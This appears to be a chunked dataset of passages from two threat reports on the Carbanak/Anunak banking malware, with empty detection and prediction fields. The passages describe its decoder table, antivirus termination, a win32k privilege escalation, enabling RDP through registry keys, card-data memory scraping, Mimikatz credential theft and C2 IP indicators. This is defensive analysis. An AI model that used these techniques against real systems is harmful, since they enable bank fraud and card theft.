        "text": "decodertable = \"\\x00\\x12\\x1C\\x13\\x0A\\x0D\\x14\\x07\\x15\\x0C\\x16\\x09\\x05\\x03\\x17\\x1D\\x1A\\x10\\x1F \\x0E\\x08\\x06\\x11\\x04\\x1E\\x19\\x0B\\x1B\\x01\\x02\\x0F\\x18\\x20\\x21\\x42\\x5E\\x24\\x25\\x26\\x4A\\x28\\x29\\x6A\\x6B \\x2C\\x2D\\x53\\x22\\x30\\x31\\x7F\\x4E\\x34\\x35\\x4B\\x5A\\x38\\x39\\x7A\\x7B\\x3C\\x3D\\x43\\x5F\\x40\\x41\\x62\\x63\\x44 \\x45\\x46\\x27\\x48\\x49\\x47\\x2B\\x4C\\x4D\\x73\\x4F\\x50\\x51\\x52\\x2E\\x54\\x55\\x56\\x57\\x58\\x59\\x3A\\x5B\\x5C\\x5D \\x7E\\x72\\x60\\x61\\x2F\\x23\\x64\\x65\\x66\\x2A\\x68\\x69\\x67\\x36\\x6C\\x6D\\x33\\x6F\\x70\\x71\\x3F\\x6E\\x74\\x75\\x76 \\x77\\x78\\x79\\x37\\x3B\\x7C\\x7D\\x3E\\x32\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\nA sample code snippet of the Decoder:\n\nAn API Hashing technique is also utilized by the malware in order to hide relevant API functions it uses in its code. Rather than storing imported API names in the body, the malware author has pre-calculated the CRC hash of the API function. On runtime, all the malware does is to look-up the equivalent API name from its generated hash table.\n",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Antivirus retaliation\nSpecific Kaspersky antivirus processes are terminated:\n\navp.exe\navpui.exe\n\n\nEscalation of Privilege\n The malware checks the system OS:\n\nWindows 8.1\nWindows 8\nWindows 7 SP1\nWindows Vista SP2\nWindows RT 8.1\nWindows RT\nWindows XP SP1\nWindows XP SP2\nWindows XP SP3\nWindows Server 2012\nWindows Server 2012 R2\nWindows Server 2008 SP2\nWindows Server 2008 R2 SP1\nWindows Server 2003 SP2\n\nIf found, it attempts to exploit a vulnerability in \"win32k.sys\" identified as CVE-2013-3660 to escalate the privilege of the malware process.\n\n Obtaining the Proxy Settings\n The malware gets the proxy setting from the Internet Explorer registry key:\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ProxyServer\nIt also gets the proxy setting stored in Mozilla's prefs.js file.\n\n The attacker however can push its own custom proxy settings to the malware.\n Enabling Remote Desktop\nThe malware enables the Remote Desktop by starting the\u00a0Termservice\u00a0service.",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "It also sets the service to auto-mode so that the service will start on Windows startup.\n",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "It also enables the following Terminal Server registry key:\nHKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\n\nfDenyTSConnection\nEnableConcurrentSessions\nAllowMultipleTSSession\n\nPOS Malware\nBefore the main POS routine, the malware searches data from the log file named \"nsb.pos.client.log\" and C:\\NSB\\Coalition\\Log\n\nIt then enumerates the processes listed in a config file (klgconfig.plug) pulled from the control server. From here it scrapes the process memory heap for credit card data, specifically the Track 1.",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "After collecting the card data, it creates a file where it stores the information.\n This is the code snippet where it saves the data to an XML file:\n\nOutlook Items\nThe malware also targets victim's email data by scrounging the victim's Outlook PST files for contact's email addresses, possibly to be used for further spear-phishing attacks from known individuals.\n\n",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Local Password Stealer\n The malware utilizes the open source project called Mimikatz and reused codes from this project to steal clear text local passwords from Lsass memory dump.\n\n Plugins\n\nifobs.pl- the malware reused code from the Carperp ifobs module to target a banking application called iFOBS. This is a very popular banking platform in Russia and Eastern Europe and this malware can be used to compromise IFOBS banking systems.",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "When using this module, the malware hooks the following libraries:\n\n{ \"VistaDB_D7.bpl\", \"HProc2\", 0xA9782FE7, \"OpenDatabaseConnection\" }, { \"RtlData1.bpl\", \"HProc3\", 0x1678D314, \"TaskAfterSynchRun\" }, { \"vcl70.bpl\", \"HProc4\", 0x8D55F8B4, \"TCustomFormShow\" }, { \"vcl70.bpl\", \"HProc5\", 0x3DF02899, \"TCustomFormCloseQuery\" }, { \"RtlStore.bpl\", \"HProc6\", 0xCF6CD66, \"GlobalAppStorage\" }, { \"RtlData1.bpl\", \"HProc7\", 0xAFD2F1E2, \"FillDataToDBCache\" },\n\nammyy.pl- this enables the malware to run AMMYY remote desktop control software\nvnc.pl- this enables the malware to run a remote desktop VNC application\n\nBackdoor Commands\nThe attacker can also send backdoor commands.",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "In the malware code, a command hash table is used to compare commands (in readable strings) sent by the attacker, the hash of this command string is calculated by the malware. If the hash of the string matches any hash in the table, it executes the corresponding action.\n The image below is the command and it's corresponding hash (in green font)\n\n\n Network\nIt connects to a hardcoded IP address: 5.45.179.173 or 95.215.45.94 through an encrypted tunnel at port 443.\n Compiler/Artifacts\nThe following sections describe artifacts found in the file\nMalware Version Info\n\nlegalcopyright: Blattering\ninternalname: Soulfulness\ncompanyname: Maidish Leveraged\nlegaltrademarks: Bobcats Kinsman\nfiledescription: Sanger\noriginalfilename: Adoptable Nightjars\n\n\nConclusion\nIn many ways, this attack follows a very common series of events:\n\nSocial engineering / phishing used to gain initial network foothold\nCleverly disguised malware establishes remote control of victim system and downloads additional tools\nAttacker conducts reconnaissance to scan network, expand foothold, and identify high-value targets\nPayment card information and/or PII (personally identifiable information) is captured and exfiltated back to the attacker.\n\n",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "However, the persistence, professionalism, and pervasiveness of this campaign is at a level rarely seen by Trustwave.",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "The malware used is very multifaceted and still not caught by most (if any) antivirus engines.",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "The social engineering is highly targeted, conducted via direct phone calls by threat actors with excellent English skills. The network reconnaissance and lateral movement is rapid and highly effective. Finally, the data exfiltration methodology is stealthy and efficient.\n",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Carbanak is one of the most sophisticated threat actors in the cybercrime realm today and this report details a very active campaign currently being leveraged against hospitality and restaurant industries (and probably others).",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "We encourage everyone to search their network for the IOC's described in this report and to contact Trustwave immediately if any are found.\n",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "**Credits for the analysis and creation of this cyber threat announcement: Rodel Mendrez, Reno Zenere, James Antonakos, Brian Hussey\n\n\n\n\n\n\n\nLatest SpiderLabs Blogs\n\n\n\nHoneypot Recon: MySQL Malware Infection via User-Defined Functions (UDF)\n",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "In the vast world of cybersecurity, as technologies evolve, so do the methods attackers employ to compromise systems.",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "One such intriguing method that recently surfaced is MySQL servers, leveraging...\nRead More\n\n\nTrustwave SpiderLabs Report:",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "the Manufacturing Sector\nAs the manufacturing sector continues its digital transformation, Operational Technology (OT), Industrial Control Systems (ICS), and Supervisory Control and Data Acquisition (SCADA) are becoming...\nRead More\n\n\nOverview of the Cyberwarfare used in Israel \u2013 Hamas War\nOn October 7, 2023, the Palestinian organization Hamas launched the biggest attack on Israel in years, resulting in numerous casualties and hostages taken. Israel responded with a large-scale ground...\nRead More\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n                  Stay Informed\n                \n\n\n\n\n\n                  Sign up to receive the latest  security news and trends straight  to your inbox from Trustwave.\n                \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n Leadership Team\nOur History\nNews Releases\nMedia Coverage\n\n\n\n\n\n\nCareers\nGlobal Locations\nAwards & Accolades\nTrials & Evaluations\n\n\n\n\n\n\nContact\nSupport\nSecurity Advisories\nSoftware Updates\n\n\n\n\n\n\n\n\n    \n\n\n\n  \n\n\n\n  \n\n\n\n   \n\n\n\n\n\n\n\n\n\n\nLegal\nTerms of Use\nPrivacy Policy\n\n\n\n\n\n\nCopyright \u00a9 2023 Trustwave Holdings, Inc.",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "you explain the timeline of the campaign?Why didn\u00b4t you make the details public until now?Have you reached victims and Computer Emergency Response Teams (CERTs) in those countries where you have detected the incidents?How did you contribute to the investigation?How was the malware distributed?What is the potential impact for victims?Who are the victims? What is the scale of the attack?How are corporate users protected against this type of attack?",
        "source": "The Great Bank Robbery_ the Carbanak APT _ Securelist.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "The story of Carbanak began when a bank from Ukraine asked us to help with a forensic investigation.",
        "source": "The Great Bank Robbery_ the Carbanak APT _ Securelist.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "However, upon investigating the hard disk of the ATM system we couldn\u2019t find anything except a rather odd VPN configuration (the netmask was set to 172.0.0.0).\n",
        "source": "The Great Bank Robbery_ the Carbanak APT _ Securelist.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "At this time we regarded it as just another malware attack. Little did we know then that a few months later one of our colleagues would receive a call at 3 a.m. in the middle of the night. On the phone was an account manager, asking us to call a certain number as matter of urgency. The person at the end of the line was the CSO of a Russian bank. One of their systems was alerting that data was being sent from their Domain Controller to the People\u2019s Republic of China.\n",
        "source": "The Great Bank Robbery_ the Carbanak APT _ Securelist.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Total financial losses could be as a high as $1bn#TheSAS2015#CarbanakTweet\nWhen we arrived on site we were quickly able to find the malware on the system.",
        "source": "The Great Bank Robbery_ the Carbanak APT _ Securelist.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "We wrote a batch script that removed the malware from an infected PC, and ran this script on all the computers at the bank.",
        "source": "The Great Bank Robbery_ the Carbanak APT _ Securelist.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "This was done multiple times until we were sure that all the machines were clean. Of course, samples were saved and through them we encountered the Carbanak malware for the first time.\n Modus Operandi\nFurther forensic analysis took us to the point of initial infection: a spear phishing e-mail with a CPL attachment; although in other cases Word documents exploiting known vulnerabilities were used. After executing the shellcode, a backdoor based on Carberp, is installed on the system.",
        "source": "The Great Bank Robbery_ the Carbanak APT _ Securelist.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Each bank robbery took 2-4 months, from infecting the first computer to cashing the money out #TheSAS2015 #CarbanakTweet\nOnce the attackers are inside the victim\u00b4s network, they perform a manual reconnaissance, trying to compromise relevant computers (such as those of administrators\u2019) and use lateral movement tools. In short, having gained access, they will jump through the network until they find their point of interest. What this point of interest is, varies according to the attack. What they all have in common, however, is that from this point it is possible to extract money from the infected entity.\n",
        "source": "The Great Bank Robbery_ the Carbanak APT _ Securelist.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "The gang behind Carbanak does not necessarily have prior knowledge of the inner workings of each bank targeted, since these vary per organisation. So in order to understand how a particular bank operates, infected computers were used to record videos that were then sent to the Command and Control servers. Even though the quality of the videos was relatively poor, they were still good enough for the attackers, armed also with the keylogged data for that particular machine to understand what the victim was doing.",
        "source": "The Great Bank Robbery_ the Carbanak APT _ Securelist.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "This provided them with the knowledge they needed to cash out the money.\n Cash out procedures\nDuring our investigation we found several ways of cashing out:\nATMs were instructed remotely to dispense cash without any interaction with the ATM itself, with the cash then collected by mules; the SWIFT network was used to transfer money out of the organisation and into criminals\u2019 accounts; and databases with account information were altered so that fake accounts could be created with a relatively high balance, with mule services being used to collect the money.\n\n Infections and losses\nSince we started investigating this campaign we have worked very closely with the law enforcement agencies (LEAs) tracking the Carbanak group.",
        "source": "The Great Bank Robbery_ the Carbanak APT _ Securelist.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "As a result of this cooperation we know that up to 100 targets have been hit. When it comes to financial institutions, In at least half of the cases the criminals were able to extract money from the infected institution.",
        "source": "The Great Bank Robbery_ the Carbanak APT _ Securelist.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "However, according to information provided by LEAs and the victims themselves, total financial losses could be as a high as $1 billion, making this by far the most successful criminal cyber campaign we have ever seen.\n Losses from #Carbanak per bank range from $2.5 million to approximately $10 million #TheSAS2015Tweet\nOur investigation began in Ukraine and then moved to Moscow, with most of the financial entities targeted by the group located in Eastern Europe. However thanks to KSN data and data obtained from the Command and Control servers, we know that Carbanak also targets victims in the USA, Germany and China.",
        "source": "The Great Bank Robbery_ the Carbanak APT _ Securelist.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "The group is still active, and we urge all financial organizations to carefully scan their networks for the presence of Carbanak.",
        "source": "The Great Bank Robbery_ the Carbanak APT _ Securelist.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "For a full description of the campaign, IOCs and list of infections please see our report.\n To check your network for Carbanak\u2019s presence, you can also use the open IOC file available here.\n\n",
        "source": "The Great Bank Robbery_ the Carbanak APT _ Securelist.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Carbanak is the name we use for an APT-style campaign targeting (but not limited to) financial institutions. The main difference with other APT attacks is that attackers do not see data but money as their primary target.",
        "source": "The Great Bank Robbery_ the Carbanak APT _ Securelist.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "We say APT-like, however the attack is not strictly speaking Advanced. Strictly speaking, the main feature defining the attackers is Persistence.\n",
        "source": "The Great Bank Robbery_ the Carbanak APT _ Securelist.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "We name the backdoor Carbanak since it is based on Carberp and the name of the configuration file is \u201canak.cfg\u201d.\n",
        "source": "The Great Bank Robbery_ the Carbanak APT _ Securelist.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "The attackers infiltrate the victim\u00b4s network looking for the critical system they can use for cashing money out.",
        "source": "The Great Bank Robbery_ the Carbanak APT _ Securelist.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Once they have stolen a significant amount of money (from 2.5 to 10 MM USD per entity), they abandon the victim.\n",
        "source": "The Great Bank Robbery_ the Carbanak APT _ Securelist.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "This time attackers are targeting financial entities directly in an unprecedented, determined, highly professional and coordinated attack, and using any means from the target to cash as much money out as possible, up to an apparently auto-imposed limit.\n",
        "source": "The Great Bank Robbery_ the Carbanak APT _ Securelist.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "According to what we know, the first malicious samples were compiled in August, 2013 when the cybercriminals started to test the Carbanak malware. The first infections were detected in December, 2013.\n",
        "source": "The Great Bank Robbery_ the Carbanak APT _ Securelist.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "On average, each bank robbery took between two and four months, from infecting the first computer at the bank\u2019s corporate network to cashing the money out.\n We believe that the gang was able to successfully steal from their first victims during the period of February-April 2014. The peak of infections was recorded in June 2014.\n",
        "source": "The Great Bank Robbery_ the Carbanak APT _ Securelist.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Currently the campaign is still active.\n Why didn\u00b4t you make the details public until now?\n",
        "source": "The Great Bank Robbery_ the Carbanak APT _ Securelist.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Since we started working on this campaign we have collaborated with the different LEAs involved in the investigation and helped them as much as possible. As it remains an open investigation, we were asked not to share any details until it was safe to do so.\n",
        "source": "The Great Bank Robbery_ the Carbanak APT _ Securelist.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Have you reached victims and Computer Emergency Response Teams (CERTs) in those countries where you have detected the incidents?\n Yes, this investigation turned into a joint operation between Kaspersky Lab\u2019s Global Research and Analysis Team and international organizations, national and regional law enforcement agencies and a number of Computer Emergency Response Teams (CERTs) worldwide.\n One of our main goals was to disseminate our knowledge of the campaign and IOCs among all detected and potential victims.",
        "source": "The Great Bank Robbery_ the Carbanak APT _ Securelist.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "We\u2019re helping to assist in investigations and countermeasures that disrupt malware operations and cybercriminal activity. During the investigations we provide technical expertise such as analyzing infection vectors, malicious programs, supported Command & Control infrastructure and exploitation methods.\n",
        "source": "The Great Bank Robbery_ the Carbanak APT _ Securelist.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Attackers used spear phishing emails with malicious attachments against employees of the targeted financial institutions, in some cases sending them to their personal email addresses.",
        "source": "The Great Bank Robbery_ the Carbanak APT _ Securelist.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "We believe the attackers also used drive by download attacks, but this second assumption is still not 100% confirmed.\n",
        "source": "The Great Bank Robbery_ the Carbanak APT _ Securelist.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "What is the potential impact for victims?\nBased on what the attackers stole from victims, a new victim faces potential losses of up to 10 million $.",
        "source": "The Great Bank Robbery_ the Carbanak APT _ Securelist.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "However this figure is arbitrary based on what we know: nothing limits the potential loss once an institution is infected.\n",
        "source": "The Great Bank Robbery_ the Carbanak APT _ Securelist.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Victims are mainly institutions in the financial industry; however we have also found traces of infections in POS terminals and PR agencies.",
        "source": "The Great Bank Robbery_ the Carbanak APT _ Securelist.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "For a sense of the scale of the attack please see the different charts and maps we provide in our report.\n As with many malware campaigns there are a variety of companies/individuals analyzing the malware, resulting in requests to the Command and Control server.",
        "source": "The Great Bank Robbery_ the Carbanak APT _ Securelist.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "When we analyze those servers, all we see are the IPs and possibly some additional information.",
        "source": "The Great Bank Robbery_ the Carbanak APT _ Securelist.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "When this additional information is not present, and when the IP cannot be traced back to its owner, we mark it as an infection.\n",
        "source": "The Great Bank Robbery_ the Carbanak APT _ Securelist.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Based on this approach our analysis concludes that Russia, the US, Germany and China are the most affected countries in number of traces of infection (IP addresses).\n",
        "source": "The Great Bank Robbery_ the Carbanak APT _ Securelist.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "All Kaspersky Lab\u2019s corporate products and solutions detect known Carbanak samples. To raise the level of protection, it is recommended to switch on Kaspersky\u2019s Proactive Defense Module included in each modern product and solution.\n We also have some general recommendations:\n\nDo not open suspicious emails, especially if they have an attachment;\nUpdate your software (in this campaign no 0days were used);\nTurn on heuristics in your security suites, this way it is more likely that such new samples will be detected and stopped from the beginning.\n\n\n\n\n\n\n\n\n",
        "source": "The Great Bank Robbery_ the Carbanak APT _ Securelist.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "APT\nCarbanak\nFinancial malware\n\n\n\nAuthors\n\n\n\n\nGReAT\n\n\n\n\n\nThe Great Bank Robbery: the Carbanak APT \n Your email address will not be published.",
        "source": "The Great Bank Robbery_ the Carbanak APT _ Securelist.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Name * \nEmail * \n\n \u00a0\n\n\n\n\nCancel \n\n\u0394 \n\n\n\n\n\n\n\nDiego Fenner \n\n\n\t\t\t\t\t\t\tPosted on\t\t\t\t\t\t\tFebruary 16, 2015. 9:47 pm \n\n\n\nImpressive.",
        "source": "The Great Bank Robbery_ the Carbanak APT _ Securelist.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "When it hits the news all over the major media, hopefully people will realize that the digital world is not safe.\n",
        "source": "The Great Bank Robbery_ the Carbanak APT _ Securelist.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "1:10 pm \n\n\n\nIt\u2019s fascinating how in the 21st century, people are still opening attachments from unknown sources, which seems to be how the malware spread. Even my mother who\u2019s just started using a computer, refrains from doing so.",
        "source": "The Great Bank Robbery_ the Carbanak APT _ Securelist.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Even more disturbing is the fact that these financial institutions didn\u2019t take adequate safety measures.",
        "source": "The Great Bank Robbery_ the Carbanak APT _ Securelist.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Besides the obvious (firewall, anitivirus and the whole technical armada), educating employees about the risks seems to be always overlooked.",
        "source": "The Great Bank Robbery_ the Carbanak APT _ Securelist.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "9:48 am \n\n\n\nGreat marketing by Kaspersky by \u201cbreaking\u201d a story that is almost 2 months old.",
        "source": "The Great Bank Robbery_ the Carbanak APT _ Securelist.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Reply \n\n\n\n\n\n\n\n\nZ \n\n\n\t\t\t\t\t\t\tPosted on\t\t\t\t\t\t\tMarch 4, 2015. 10:38 am \n\n\n\n\u201cWhy didn\u00b4t you make the details public until now?\n",
        "source": "The Great Bank Robbery_ the Carbanak APT _ Securelist.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Since we started working on this campaign we have collaborated with the different LEAs involved in the investigation and helped them as much as possible.",
        "source": "The Great Bank Robbery_ the Carbanak APT _ Securelist.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "As it remains an open investigation, we were asked not to share any details until it was safe to do so.\u201d\n",
        "source": "The Great Bank Robbery_ the Carbanak APT _ Securelist.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "+ the fact that the Anunak report is basically the first volume of the same story \u2013 the Kaspersky report is the follow-up, from their point of view and work with the LEAs.\n",
        "source": "The Great Bank Robbery_ the Carbanak APT _ Securelist.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "\u201cBut I still value your efforts and research\u201d \ud83d\ude1b\nps: they could and should have mentioned that other report here, yes, but you know how competition goes between security groups\u2026\nReply \n\n\n\n\n\n\n\n\n\n\nSteven \n\n\n\t\t\t\t\t\t\tPosted on\t\t\t\t\t\t\tFebruary 19, 2015. 6:28 pm \n\n\n\nExcellent research.  ",
        "source": "The Great Bank Robbery_ the Carbanak APT _ Securelist.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "There are some differences in the IOCs as published in the Full Report (PDF) and the OpenIOC file.  ",
        "source": "The Great Bank Robbery_ the Carbanak APT _ Securelist.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "For instance, the domain adobe-update.net appears in the PDF version but not in the OpenIOC version.\n",
        "source": "The Great Bank Robbery_ the Carbanak APT _ Securelist.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Linux and Open Source Software is the solution.   why do you think the Navy switched their Nuke Subs to Linux??   and their Drone Program??\nand the NY Stock exchange switched to Linux.",
        "source": "The Great Bank Robbery_ the Carbanak APT _ Securelist.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "they didn\u2019t do it to upset you or offend your Love of Microsoft. they did it to increase security.  ",
        "source": "The Great Bank Robbery_ the Carbanak APT _ Securelist.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "We\u2019ll still get in because your whole system of living is weak.\n Your whole reality is based on lies.",
        "source": "The Great Bank Robbery_ the Carbanak APT _ Securelist.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "For c2\nReply \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nTable of Contents\n\n\n\n\n\nModus OperandiCash out proceduresInfections and lossesFAQWhat is Carbanak?What are the malicious purposes of this campaign?Why do you think it is",
        "source": "The Great Bank Robbery_ the Carbanak APT _ Securelist.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "you explain the timeline of the campaign?Why didn\u00b4t you make the details public until now?Have you reached victims and Computer Emergency Response Teams (CERTs) in those countries where you have detected the incidents?How did you contribute to the investigation?How was the malware distributed?What is the potential impact for victims?Who are the victims? What is the scale of the attack?How are corporate users protected against this type of attack?",
        "source": "The Great Bank Robbery_ the Carbanak APT _ Securelist.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "GReAT webinars\n\n\n\n\n\n\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t13 May 2021, 1:00pm\t\t\t\t\t\t\t\t\nGReAT Ideas. Balalaika Edition \n\n\n\n\n\nBoris Larin\n\n\n\nDenis Legezo\n\n\n\n\n\n\n\n\n\n\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t26 Feb 2021, 12:00pm\t\t\t\t\t\t\t\t\nGReAT Ideas. Green Tea Edition \n\n\n\n\n\nJohn Hultquist\n\n\n\nBrian Bartholomew\n\n\n\nSuguru Ishimaru\n\n\n\nVitaly Kamluk\n\n\n\nSeongsu Park\n\n\n\nYusuke Niwa\n\n\n\nMotohiko Sato\n\n\n\n\n\n\n\n\n\n\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t17 Jun 2020, 1:00pm\t\t\t\t\t\t\t\t\nGReAT Ideas. Powered by SAS: malware attribution and next-gen IoT honeypots \n\n\n\n\n\nMarco Preuss\n\n\n\nDenis Legezo\n\n\n\nCostin Raiu\n\n\n\nKurt Baumgartner\n\n\n\nDan Demeter\n\n\n\nYaroslav Shmelev\n\n\n\n\n\n\n\n\n\n\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t26 Aug 2020, 2:00pm\t\t\t\t\t\t\t\t\nGReAT Ideas. Powered by SAS: threat actors advance on new fronts \n\n\n\n\n\nIvan Kwiatkowski\n\n\n\nMaher Yamout\n\n\n\nNoushin Shabab\n\n\n\nPierre Delcher\n\n\n\nF\u00e9lix Aime\n\n\n\nGiampaolo Dedola\n\n\n\nSantiago Pontiroli\n\n\n\n\n\n\n\n\n\n\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t22 Jul 2020, 2:00pm\t\t\t\t\t\t\t\t\nGReAT Ideas. Powered by SAS: threat hunting and new techniques \n\n\n\n\n\nDmitry Bestuzhev\n\n\n\nCostin Raiu\n\n\n\nPierre Delcher\n\n\n\nBrian Bartholomew\n\n\n\nBoris Larin\n\n\n\nAriel Jungheit\n\n\n\nFabio Assolini\n\n\n\n\n\n\n\n\n\n\n\n\nFrom the same authors\n\n\n\n\n \n\n\nFakeSG campaign, Akira ransomware and AMOS macOS stealer \n\n\n\n\n\n\n \n\n\nAdvanced threat predictions for 2024 \n\n\n\n\n\n\n \n\n\nStealer for PIX payment system, new Lumar stealer and Rhysida ransomware \n\n\n\n\n\n\n \n\n\nUpdated MATA attacks industrial companies in Eastern Europe \n\n\n\n\n\n\n \n\n\nAPT trends report Q3 2023 \n\n\n\n\n\n\n\n\n\nSubscribe to our weekly e-mails\nThe hottest research right in your inbox\n\n\n\n\n\nEmail\n*\n\nI agree to provide my email address to \u201cAO Kaspersky Lab\u201d to receive information about new posts on the site.",
        "source": "The Great Bank Robbery_ the Carbanak APT _ Securelist.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "I understand that I can withdraw this consent at any time via e-mail by clicking the \u201cunsubscribe\u201d link that I find at the bottom of any e-mail sent to me for the purposes mentioned above.\n\n \n ",
        "source": "The Great Bank Robbery_ the Carbanak APT _ Securelist.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Modern Asian APT groups\u2019 tactics, techniques and procedures (TTPs) \n\nAsian APT groups target various organizations from a multitude of regions and industries.",
        "source": "The Great Bank Robbery_ the Carbanak APT _ Securelist.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "We created this report to provide the cybersecurity community with the best-prepared intelligence data to effectively counteract Asian APT groups.\n\n\n\n\n\n\n\n\n ",
        "source": "The Great Bank Robbery_ the Carbanak APT _ Securelist.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "A cascade of compromise: unveiling Lazarus\u2019 new campaign \n\nWe unveil a Lazarus campaign exploiting security company products and examine its intricate connections with other campaigns\n\n\n\n\n\n\n\n\nHow to catch a wild triangle \n\nHow Kaspersky researchers obtained all stages of the Operation Triangulation campaign targeting iPhones and iPads, including zero-day exploits, validators, TriangleDB implant and additional modules.\n\n\n\n\n\n\n\n\n \n\n\n\n\n\n\n\n\n\n  Subscribe to our weekly e-mails\nThe hottest research right in your inbox\n\n\n\n\n\nEmail*\n\n*\n\nI agree to provide my email address to \u201cAO Kaspersky Lab\u201d to receive information about new posts on the site. I understand that I can withdraw this consent at any time via e-mail by clicking the \u201cunsubscribe\u201d link that I find at the bottom of any e-mail sent to me for the purposes mentioned above.\n\n \n Subscribe\n\n\n\n\n\n\n\n\n\n\n\n\u0394\n\n\n\n\n\n\n\n\n \n\n\n\n\n\n\n\n\n\n\n\nThreatsThreats\n\nAPT (Targeted attacks)\nSecure environment (IoT)\n ",
        "source": "The Great Bank Robbery_ the Carbanak APT _ Securelist.html",
        "detection": {},
        "prediction": {}
    },
    {
